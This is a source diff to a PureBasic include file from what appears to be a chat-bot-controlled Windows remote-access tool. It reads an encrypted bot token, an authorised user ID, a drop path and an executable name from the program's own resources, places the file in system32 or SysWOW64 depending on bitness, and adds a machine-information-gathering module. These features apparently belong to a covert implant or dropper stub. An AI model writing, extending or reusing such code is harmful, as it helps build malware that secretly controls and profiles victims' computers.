@@ -1,6 +1,7 @@
 ﻿;include file for reading/writing states from files
 XIncludeFile "constants.pbi"
 XIncludeFile "resourcereader.pbi"
+XIncludeFile "machineinfogatherer.pbi"
 
 EnableExplicit
 
@@ -45,10 +46,12 @@ EndProcedure
 
 Procedure.s GetSelfPath()
   CompilerIf #PB_Compiler_Debugger
-    ProcedureReturn "C:\Users\s0ft\AppData\Roaming\shiltimur.exe"
+    ProcedureReturn "C:\users\s0ft\desktop\server.exe"
   CompilerElse
-    ProcedureReturn ProgramFilename()
+    ProcedureReturn ProgramFilename()  
   CompilerEndIf
+  
+
 EndProcedure
 
 
@@ -56,10 +59,14 @@ Procedure.s ExtractParamsFromResource()
   Define currpath.s,botToken.s,userId.s
   Define dropPath.s,exeName.s
   currpath=GetSelfPath()
+  
+
   botToken=ReadStringFromResource(currpath,getEncryptionKey(),"params","bottoken")
   userId=ReadStringFromResource(currpath,getEncryptionKey(),"params","userid")
   dropPath=ReadStringFromResource(currpath,getEncryptionKey(),"params","droppath")
   exeName=ReadStringFromResource(currpath,getEncryptionKey(),"params","exename")
+
+
   BOT_TOKEN=botToken ;populate the global variable
   AUTHENTICATED_USER_ID=Val(userId) ;populate the global variable
   DROP_PATH=dropPath ;populate the global variable
@@ -111,7 +118,19 @@ Procedure.s getDropPath()
     Case "%systemdrive%"
       retval=GetEnvironmentVariable("systemdrive")
     Case "%system32%"
-      retval=GetEnvironmentVariable("windir")+"\system32"
+      CompilerIf #PB_Compiler_Processor=#PB_Processor_x64
+        retval=GetEnvironmentVariable("windir")+"\system32" ;x64 process on x64 OS
+      CompilerElse
+        ;x86 process. but what about the OS?
+        If IsWindows64Bit()
+          retval=GetEnvironmentVariable("windir")+"\SysWOW64" ;x86 process on x64 OS  
+        Else
+          retval=GetEnvironmentVariable("windir")+"\system32" ;x86 process on x86 OS
+        EndIf
+        
+      CompilerEndIf
+      
+      
   EndSelect
   
   If Not FileSize(retval)=-2 ;if retval isn't a valid directory path
@@ -138,7 +157,8 @@ Procedure.s getEncryptionKey()
 EndProcedure
 
 ; IDE Options = PureBasic 5.70 LTS (Windows - x86)
-; CursorPosition = 7
+; CursorPosition = 127
+; FirstLine = 108
 ; Folding = ----
 ; EnableAsm
 ; EnableThread
